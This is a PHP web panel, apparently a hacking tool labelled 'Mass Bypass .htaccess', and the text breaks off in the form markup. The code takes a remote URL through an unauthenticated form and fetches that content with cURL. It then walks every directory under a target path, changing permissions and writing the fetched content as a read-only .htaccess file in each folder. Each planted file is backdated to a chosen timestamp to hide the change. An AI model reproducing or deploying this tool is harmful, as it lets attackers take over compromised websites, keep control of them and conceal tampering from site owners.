<?php
// error_reporting(0); // Uncomment for production to hide errors
$successLog = [];
$errorLog = [];
$totalFolders = 0;
$showResults = false;

// --- REVISI 1: Pindahkan definisi fungsi keluar dari blok if ---
/**
 * Recursively processes directories to modify file permissions and deploy content.
 */
function processFolder($dir, $originalName, $fileContent, $timestampUnix, &$successLog, &$errorLog, &$totalFolders) {
    // Gunakan iterator untuk kinerja yang lebih baik pada direktori besar
    try {
        $iterator = new DirectoryIterator($dir);
    } catch (Exception $e) {
        $errorLog[] = "❌ Error reading directory: <code>$dir</code> (" . $e->getMessage() . ")";
        return;
    }

    foreach ($iterator as $item) {
        if ($item->isDot()) continue;
        
        $path = $item->getPathname();
        $path = str_replace('\\', '/', $path); // Standardize path separators for logs
        $currentTimestamp = date('Y-m-d H:i:s', $timestampUnix);

        if ($item->isDir()) {
            $totalFolders++;
            
            // Set folder permissions to 0755
            if (@chmod($path, 0755)) {
                $successLog[] = "🔧 Folder chmod 0755: <code>$path</code>";
            } else {
                $errorLog[] = "⚠️ Failed to chmod folder: <code>$path</code>";
            }

            // Set permissions for files inside the folder to 0644 (except .htaccess)
            try {
                $innerIterator = new DirectoryIterator($path);
            } catch (Exception $e) {
                $errorLog[] = "❌ Error reading subdirectory: <code>$path</code>";
                // Lanjutkan ke direktori berikutnya
                processFolder($path, $originalName, $fileContent, $timestampUnix, $successLog, $errorLog, $totalFolders);
                continue;
            }

            foreach ($innerIterator as $inner) {
                if ($inner->isDot() || $inner->isDir()) continue;
                
                $innerPath = $inner->getPathname();
                $innerPath = str_replace('\\', '/', $innerPath);
                
                if (basename($innerPath) !== '.htaccess') {
                    if (@chmod($innerPath, 0644)) {
                        $successLog[] = "📝 File chmod 0644: <code>$innerPath</code>";
                    } else {
                        $errorLog[] = "⚠️ Failed to chmod file: <code>$innerPath</code>";
                    }
                }
            }
            
            // Step 2: "Upload" file to directory
            $uploadFile = $path . '/' . $originalName;
            
            // Gunakan file_put_contents yang lebih aman (tanpa @ agar error terekam)
            if (file_put_contents($uploadFile, $fileContent) === false) {
                // Gunakan error_get_last() untuk mencari tahu mengapa gagal
                $lastError = error_get_last();
                $errorLog[] = "❌ Failed to save file to: <code>$uploadFile</code>. Reason: " . ($lastError['message'] ?? 'Unknown');
            } else {
                // Set uploaded file permissions to 0644
                if (@chmod($uploadFile, 0644)) {
                    $successLog[] = "📁 File saved: <code>$uploadFile</code> (chmod 0644)";
                } else {
                    $errorLog[] = "⚠️ Failed to chmod saved file: <code>$uploadFile</code>";
                }

                // Step 3: Rename to .htaccess and secure
                $htaccess = $path . '/.htaccess';
                if (@rename($uploadFile, $htaccess)) {
                    $successLog[] = "✅ Renamed to .htaccess: <code>$htaccess</code>";

                    // Set modification time
                    if (@touch($htaccess, $timestampUnix)) {
                        $successLog[] = "⏰ Time set to $currentTimestamp for <code>$htaccess</code>";
                    } else {
                        $errorLog[] = "⚠️ Failed to set time for <code>$htaccess</code>";
                    }

                    // Set permission to 0444
                    if (@chmod($htaccess, 0444)) {
                        $successLog[] = "🔒 .htaccess secured (chmod 0444): <code>$htaccess</code>";
                    } else {
                        $errorLog[] = "⚠️ Failed to chmod 0444 for <code>$htaccess</code>";
                    }
                } else {
                    $errorLog[] = "❌ Failed to rename to .htaccess in: <code>$path</code>";
                }
            }

            // Recursive processing
            processFolder($path, $originalName, $fileContent, $timestampUnix, $successLog, $errorLog, $totalFolders);
        }
    }
}
// ---------------------------------------------------------------------------------


if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['remote_url']) && !empty($_POST['file_name']) && isset($_POST['target_path'])) {
    $showResults = true;
    
    // REVISI 2: Gunakan realpath dan rtrim lebih aman
    $targetPath = realpath(rtrim($_POST['target_path'], '/'));
    if ($targetPath === false) {
        $errorLog[] = "❌ Target directory path is invalid or inaccessible.";
        $showResults = true;
        goto display_output;
    }
    $targetPath = str_replace('\\', '/', $targetPath); // Standardize path separator
    
    $rawTimestamp = trim($_POST['timestamp']);
    $timestampUnix = strtotime($rawTimestamp);
    
    // NEW: Get remote URL and desired filename from POST data
    $remoteUrl = trim($_POST['remote_url']);
    
    // basename() sudah bagus, tapi pastikan input string-nya benar
    $originalName = basename(trim((string)$_POST['file_name']));

    if (!is_dir($targetPath)) {
        $errorLog[] = "❌ Target directory not found: <code>$targetPath</code>";
    } else {
        // NEW: Fetch file content from the remote URL
        // Gunakan cURL untuk penanganan error yang lebih baik daripada file_get_contents()
        $ch = curl_init($remoteUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $fileContent = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($fileContent === false || $httpCode !== 200) {
            $errorLog[] = "❌ Failed to fetch content from URL: <code>$remoteUrl</code> (HTTP Code: $httpCode)";
        } else {
            // Panggil fungsi rekursif
            processFolder($targetPath, $originalName, $fileContent, $timestampUnix, $successLog, $errorLog, $totalFolders);
        }
    }
}

display_output: // Label untuk goto jika terjadi error fatal sebelum fungsi dipanggil
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RemoteDeploy Pro - Mass File Deployment System</title>
    <style>
        /* CSS styles remain the same as the original */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%); color: #e0e0e0; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 40px; padding: 30px 0; border-bottom: 2px solid #00ff88; }
        .header h1 { font-size: 2.5rem; color: #00ff88; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0, 255, 136, 0.3); }
        .header p { color: #b0b0b0; font-size: 1.1rem; }
        .upload-section { background: rgba(30, 30, 45, 0.9); border-radius: 15px; padding: 30px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 255, 136, 0.2); }
        .form-group { margin-bottom: 25px; }
        .form-group label { display: block; margin-bottom: 8px; color: #00ff88; font-weight: 600; font-size: 1.1rem; }
        .form-group input[type="text"] { width: 100%; padding: 15px; background: rgba(20, 20, 30, 0.8); border: 2px solid rgba(0, 255, 136, 0.3); border-radius: 8px; color: #e0e0e0; font-size: 1rem; transition: all 0.3s ease; }
        .form-group input[type="text"]:focus { outline: none; border-color: #00ff88; box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
        .upload-btn { background: linear-gradient(45deg, #00ff88, #00e5ff); color: #000; border: none; padding: 15px 40px; font-size: 1.1rem; font-weight: bold; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; width: 100%; margin-top: 20px; }
        .upload-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3); }
        .upload-btn:disabled { background: #444; color: #888; cursor: not-allowed; transform: none; box-shadow: none; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: rgba(30, 30, 45, 0.9); padding: 20px; border-radius: 10px; text-align: center; border: 1px solid rgba(0, 255, 136, 0.2); }
        .stat-number { font-size: 2rem; font-weight: bold; color: #00ff88; }
        .stat-label { color: #b0b0b0; margin-top: 5px; }
        .logs-section { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 30px; animation: slideUp 0.5s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }.log-box{ background: rgba(20, 20, 30, 0.9); border-radius: 12px; padding: 20px; max-height: 500px; overflow-y: auto; border: 1px solid rgba(255, 255, 255, 0.1); }
        .log-box.success { border-left: 5px solid #00ff88; }
        .log-box.error { border-left: 5px solid #ff4444; }
        .log-title { font-size: 1.2rem; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
        .log-title.success { color: #00ff88; }
        .log-title.error { color: #ff4444; }
        .log-entry { padding: 8px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); font-family: 'Courier New', monospace; font-size: 0.9rem; line-height: 1.4; animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .log-entry:last-child { border-bottom: none; }
        .reset-btn { background: rgba(255, 68, 68, 0.8); color: white; border: none; padding: 10px 20px; font-size: 0.9rem; font-weight: bold; border-radius: 6px; cursor: pointer; transition: all 0.3s ease; margin-top: 20px; }
        .reset-btn:hover { background: rgba(255, 68, 68, 1); transform: translateY(-1px); }
        code { background: rgba(0, 255, 136, 0.1); padding: 2px 6px; border-radius: 3px; color: #00ff88; }
        .processing-indicator { display: none; text-align: center; padding: 20px; color: #00ff88; font-size: 1.1rem; }
        .processing-indicator.show { display: block; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .header h1 { font-size: 2rem; }
            .upload-section { padding: 20px; }
            .logs-section { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Bypass .htaccess</h1>
            <p>Mass Bypass .htaccess by Senyum Gan (Remote Version)</p>
        </div>

        <div class="upload-section">
            <form id="uploadForm" method="POST" enctype="multipart/form-data">
